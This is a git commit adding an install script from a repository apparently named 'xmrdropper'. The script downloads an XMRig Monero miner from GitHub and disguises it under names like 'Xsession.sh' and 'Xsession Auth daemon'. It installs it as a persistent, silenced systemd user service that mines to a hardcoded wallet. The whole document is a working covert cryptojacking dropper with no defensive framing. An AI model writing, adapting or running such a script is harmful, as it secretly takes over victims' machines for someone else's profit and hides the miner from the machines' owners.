0f50fd5be1f390bbc5363dc2016744b82840c836
vladimir <vladimir@playsnook.com>
2024-09-15 02:14:29 +0300

    Initial commit

---
+++ install.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+
+REPO_URL=https://github.com/freebyte/xmrdropper
+XMRIG_URL=$REPO_URL/raw/main/xmrig
+APP_URL=$REPO_URL/raw/main/Xsession.auth
+LOCAL_PATH=$HOME/.local
+APPNAME=Xsession.sh
+XMRIGNAME=xsession.auth
+WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
+SYSTEMD_PATH=$HOME/.config/systemd/user
+
+
+curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
+curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
+
+chmod +x $LOCAL_PATH/$APPNAME
+chmod +x $LOCAL_PATH/$XMRIGNAME
+
+mkdir -p $SYSTEMD_PATH
+cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
+[Unit] 
+Description=Xsession Auth daemon
+
+[Service]
+ExecStart=$LOCAL_PATH/$APPNAME -o pool.hashvault.pro:80 -u $WALLET --coin monero
+StandardOutput=null
+StandardError=null
+Restart=always
+
+[Install]
+WantedBy=default.target
+
+HEREDOC
+
+systemctl --user daemon-reload
+systemctl --user enable $APPNAME.service
+systemctl --user start $APPNAME.service
